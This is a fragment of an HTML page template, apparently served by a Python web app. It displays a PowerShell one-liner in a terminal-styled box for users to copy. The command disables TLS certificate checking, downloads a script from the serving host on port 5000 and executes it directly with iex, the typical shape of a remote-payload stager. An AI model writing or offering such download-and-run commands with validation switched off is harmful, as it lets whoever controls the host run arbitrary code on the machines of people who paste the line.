    ...
    <body>
        ...
        <div class="card" style="background-color: #e9ecef;">
            ...
            <div style="background: #212529; color: #20c20e; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 0.85rem; word-break: break-all; margin-bottom: 15px;">
                [Net.ServicePointManager]::SecurityProtocol = 3072; try {{ Add-Type -TypeDefinition 'using System.Net; using System.Security.Cryptography.X509Certificates; public class T : ICertificatePolicy {{ public bool CheckValidationResult(ServicePoint s, X509Certificate c, WebRequest r, int p) {{ return true; }} }}' }} catch {{}}; [System.Net.ServicePointManager]::CertificatePolicy = New-Object T; iex (New-Object System.Net.WebClient).DownloadString('{scheme}://{current_host}:5000/script')
            </div>
